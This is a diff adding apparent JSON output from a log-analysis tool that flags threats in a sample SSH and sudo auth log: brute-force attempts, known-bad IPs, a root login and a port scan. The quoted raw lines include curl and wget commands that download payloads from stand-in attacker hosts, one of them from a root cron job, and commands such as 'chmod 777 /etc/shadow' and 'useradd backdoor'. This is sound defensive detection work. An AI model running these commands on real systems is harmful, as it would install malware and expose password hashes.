@@ -1,0 +1,334 @@
+{
+  "log_file": "sample_auth.log",
+  "analyzed_at": "2026-05-09T06:48:47.435948+00:00",
+  "total_alerts": 40,
+  "brute_counts": {
+    "192.168.1.100": 5,
+    "10.0.0.99": 6,
+    "198.51.100.7": 5,
+    "192.168.100.200": 5,
+    "203.0.113.42": 1
+  },
+  "alerts": [
+    {
+      "line": 5,
+      "threat": "BRUTE_FORCE",
+      "severity": "MEDIUM",
+      "ip": "192.168.1.100",
+      "raw": "May  7 09:00:13 server sshd[1001]: Failed password for admin from 192.168.1.100 port 22 ssh2",
+      "ts": "2026-05-09T06:48:47.434431+00:00"
+    },
+    {
+      "line": 7,
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "10.0.0.99",
+      "raw": "May  7 09:01:00 server sshd[1002]: Failed password for root from 10.0.0.99 port 4444 ssh2",
+      "ts": "2026-05-09T06:48:47.434997+00:00"
+    },
+    {
+      "line": 8,
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "10.0.0.99",
+      "raw": "May  7 09:01:03 server sshd[1002]: Failed password for root from 10.0.0.99 port 4444 ssh2",
+      "ts": "2026-05-09T06:48:47.435025+00:00"
+    },
+    {
+      "line": 9,
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "10.0.0.99",
+      "raw": "May  7 09:01:06 server sshd[1002]: Failed password for root from 10.0.0.99 port 4444 ssh2",
+      "ts": "2026-05-09T06:48:47.435056+00:00"
+    },
+    {
+      "line": 10,
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "10.0.0.99",
+      "raw": "May  7 09:01:09 server sshd[1002]: Failed password for root from 10.0.0.99 port 4444 ssh2",
+      "ts": "2026-05-09T06:48:47.435081+00:00"
+    },
+    {
+      "line": 11,
+      "threat": "BRUTE_FORCE",
+      "severity": "MEDIUM",
+      "ip": "10.0.0.99",
+      "raw": "May  7 09:01:12 server sshd[1002]: Failed password for root from 10.0.0.99 port 4444 ssh2",
+      "ts": "2026-05-09T06:48:47.435091+00:00"
+    },
+    {
+      "line": 11,
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "10.0.0.99",
+      "raw": "May  7 09:01:12 server sshd[1002]: Failed password for root from 10.0.0.99 port 4444 ssh2",
+      "ts": "2026-05-09T06:48:47.435111+00:00"
+    },
+    {
+      "line": 12,
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "10.0.0.99",
+      "raw": "May  7 09:01:15 server sshd[1002]: Failed password for root from 10.0.0.99 port 4444 ssh2",
+      "ts": "2026-05-09T06:48:47.435135+00:00"
+    },
+    {
+      "line": 13,
+      "threat": "INVALID_USER",
+      "severity": "LOW",
+      "ip": "oracle",
+      "raw": "May  7 09:02:00 server sshd[1003]: Invalid user oracle from 185.220.101.1 port 1234 ssh2",
+      "ts": "2026-05-09T06:48:47.435145+00:00"
+    },
+    {
+      "line": 13,
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "185.220.101.1",
+      "raw": "May  7 09:02:00 server sshd[1003]: Invalid user oracle from 185.220.101.1 port 1234 ssh2",
+      "ts": "2026-05-09T06:48:47.435166+00:00"
+    },
+    {
+      "line": 14,
+      "threat": "INVALID_USER",
+      "severity": "LOW",
+      "ip": "postgres",
+      "raw": "May  7 09:02:01 server sshd[1003]: Invalid user postgres from 185.220.101.1 port 1235 ssh2",
+      "ts": "2026-05-09T06:48:47.435180+00:00"
+    },
+    {
+      "line": 14,
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "185.220.101.1",
+      "raw": "May  7 09:02:01 server sshd[1003]: Invalid user postgres from 185.220.101.1 port 1235 ssh2",
+      "ts": "2026-05-09T06:48:47.435199+00:00"
+    },
+    {
+      "line": 15,
+      "threat": "INVALID_USER",
+      "severity": "LOW",
+      "ip": "tomcat",
+      "raw": "May  7 09:02:02 server sshd[1003]: Invalid user tomcat from 185.220.101.1 port 1236 ssh2",
+      "ts": "2026-05-09T06:48:47.435208+00:00"
+    },
+    {
+      "line": 15,
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "185.220.101.1",
+      "raw": "May  7 09:02:02 server sshd[1003]: Invalid user tomcat from 185.220.101.1 port 1236 ssh2",
+      "ts": "2026-05-09T06:48:47.435227+00:00"
+    },
+    {
+      "line": 16,
+      "threat": "ROOT_LOGIN",
+      "severity": "CRITICAL",
+      "ip": "203.0.113.42",
+      "raw": "May  7 09:03:00 server sshd[1004]: ROOT LOGIN  accepted FROM 203.0.113.42",
+      "ts": "2026-05-09T06:48:47.435243+00:00"
+    },
+    {
+      "line": 16,
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "203.0.113.42",
+      "raw": "May  7 09:03:00 server sshd[1004]: ROOT LOGIN  accepted FROM 203.0.113.42",
+      "ts": "2026-05-09T06:48:47.435253+00:00"
+    },
+    {
+      "line": 17,
+      "threat": "PRIV_ESCALATION",
+      "severity": "HIGH",
+      "ip": "useradd",
+      "raw": "May  7 09:04:00 server sudo[1005]: operator : COMMAND=/usr/sbin/useradd backdoor",
+      "ts": "2026-05-09T06:48:47.435270+00:00"
+    },
+    {
+      "line": 18,
+      "threat": "ACCEPTED_PUBKEY",
+      "severity": "HIGH",
+      "ip": "N/A",
+      "raw": "May  7 09:05:00 server sshd[1006]: Accepted publickey for root from 192.168.1.77 port 22 ssh2",
+      "ts": "2026-05-09T06:48:47.435331+00:00"
+    },
+    {
+      "line": 19,
+      "threat": "MALWARE_DROPPER",
+      "severity": "CRITICAL",
+      "ip": "curl",
+      "raw": "May  7 09:06:00 server bash[1007]: curl http://malicious-host.ru/dropper.sh -o /tmp/dropper.sh",
+      "ts": "2026-05-09T06:48:47.435381+00:00"
+    },
+    {
+      "line": 20,
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "198.51.100.7",
+      "raw": "May  7 09:07:00 server sshd[1008]: Failed password for ubuntu from 198.51.100.7 port 22 ssh2",
+      "ts": "2026-05-09T06:48:47.435450+00:00"
+    },
+    {
+      "line": 21,
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "198.51.100.7",
+      "raw": "May  7 09:07:03 server sshd[1008]: Failed password for ubuntu from 198.51.100.7 port 22 ssh2",
+      "ts": "2026-05-09T06:48:47.435482+00:00"
+    },
+    {
+      "line": 22,
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "198.51.100.7",
+      "raw": "May  7 09:07:06 server sshd[1008]: Failed password for ubuntu from 198.51.100.7 port 22 ssh2",
+      "ts": "2026-05-09T06:48:47.435516+00:00"
+    },
+    {
+      "line": 23,
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "198.51.100.7",
+      "raw": "May  7 09:07:09 server sshd[1008]: Failed password for ubuntu from 198.51.100.7 port 22 ssh2",
+      "ts": "2026-05-09T06:48:47.435545+00:00"
+    },
+    {
+      "line": 24,
+      "threat": "BRUTE_FORCE",
+      "severity": "MEDIUM",
+      "ip": "198.51.100.7",
+      "raw": "May  7 09:07:12 server sshd[1008]: Failed password for ubuntu from 198.51.100.7 port 22 ssh2",
+      "ts": "2026-05-09T06:48:47.435558+00:00"
+    },
+    {
+      "line": 24,
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "198.51.100.7",
+      "raw": "May  7 09:07:12 server sshd[1008]: Failed password for ubuntu from 198.51.100.7 port 22 ssh2",
+      "ts": "2026-05-09T06:48:47.435575+00:00"
+    },
+    {
+      "line": 26,
+      "threat": "MALWARE_DROPPER",
+      "severity": "CRITICAL",
+      "ip": "wget",
+      "raw": "May  7 09:09:00 server cron[1010]: (root) CMD (/usr/bin/wget http://c2server.net/update.exe -O /tmp/u.exe)",
+      "ts": "2026-05-09T06:48:47.435611+00:00"
+    },
+    {
+      "line": 27,
+      "threat": "PRIV_ESCALATION",
+      "severity": "HIGH",
+      "ip": "chmod 777",
+      "raw": "May  7 09:10:00 server sudo[1011]: alice : COMMAND=/usr/bin/chmod 777 /etc/shadow",
+      "ts": "2026-05-09T06:48:47.435623+00:00"
+    },
+    {
+      "line": 28,
+      "threat": "PORT_SCAN",
+      "severity": "HIGH",
+      "ip": "nmap",
+      "raw": "May  7 09:11:00 server kernel[1012]: nmap scan detected from 192.168.100.200",
+      "ts": "2026-05-09T06:48:47.435643+00:00"
+    },
+    {
+      "line": 28,
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "192.168.100.200",
+      "raw": "May  7 09:11:00 server kernel[1012]: nmap scan detected from 192.168.100.200",
+      "ts": "2026-05-09T06:48:47.435652+00:00"
+    },
+    {
+      "line": 29,
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "192.168.100.200",
+      "raw": "May  7 09:12:00 server sshd[1013]: Failed password for deploy from 192.168.100.200 port 22 ssh2",
+      "ts": "2026-05-09T06:48:47.435673+00:00"
+    },
+    {
+      "line": 30,
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "192.168.100.200",
+      "raw": "May  7 09:12:03 server sshd[1013]: Failed password for deploy from 192.168.100.200 port 22 ssh2",
+      "ts": "2026-05-09T06:48:47.435692+00:00"
+    },
+    {
+      "line": 31,
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "192.168.100.200",
+      "raw": "May  7 09:12:06 server sshd[1013]: Failed password for deploy from 192.168.100.200 port 22 ssh2",
+      "ts": "2026-05-09T06:48:47.435712+00:00"
+    },
+    {
+      "line": 32,
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "192.168.100.200",
+      "raw": "May  7 09:12:09 server sshd[1013]: Failed password for deploy from 192.168.100.200 port 22 ssh2",
+      "ts": "2026-05-09T06:48:47.435739+00:00"
+    },
+    {
+      "line": 33,
+      "threat": "BRUTE_FORCE",
+      "severity": "MEDIUM",
+      "ip": "192.168.100.200",
+      "raw": "May  7 09:12:12 server sshd[1013]: Failed password for deploy from 192.168.100.200 port 22 ssh2",
+      "ts": "2026-05-09T06:48:47.435750+00:00"
+    },
+    {
+      "line": 33,
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "192.168.100.200",
+      "raw": "May  7 09:12:12 server sshd[1013]: Failed password for deploy from 192.168.100.200 port 22 ssh2",
+      "ts": "2026-05-09T06:48:47.435775+00:00"
+    },
+    {
+      "line": 35,
+      "threat": "PRIV_ESCALATION",
+      "severity": "HIGH",
+      "ip": "visudo",
+      "raw": "May  7 09:16:00 server sudo[1015]: bob : COMMAND=/usr/sbin/visudo",
+      "ts": "2026-05-09T06:48:47.435800+00:00"
+    },
+    {
+      "line": 36,
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "203.0.113.42",
+      "raw": "May  7 09:17:00 server sshd[1016]: Failed password for ftpuser from 203.0.113.42 port 21 ftp",
+      "ts": "2026-05-09T06:48:47.435830+00:00"
+    },
+    {
+      "line": 37,
+      "threat": "INVALID_USER",
+      "severity": "LOW",
+      "ip": "guest",
+      "raw": "May  7 09:18:00 server sshd[1017]: Invalid user guest from 10.0.0.99 port 22 ssh2",
+      "ts": "2026-05-09T06:48:47.435837+00:00"
+    },
+    {
+      "line": 37,
+      "threat": "KNOWN_BAD_IP",
+      "severity": "CRITICAL",
+      "ip": "10.0.0.99",
+      "raw": "May  7 09:18:00 server sshd[1017]: Invalid user guest from 10.0.0.99 port 22 ssh2",
+      "ts": "2026-05-09T06:48:47.435853+00:00"
+    },
+    {
+      "line": 38,
+      "threat": "MALWARE_DROPPER",
+      "severity": "CRITICAL",
+      "ip": "wget",
+      "raw": "May  7 09:19:00 server bash[1018]: wget http://evil.example.com/payload.ps1 -OutFile /tmp/p.ps1",
+      "ts": "2026-05-09T06:48:47.435871+00:00"
+    }
+  ]
+}
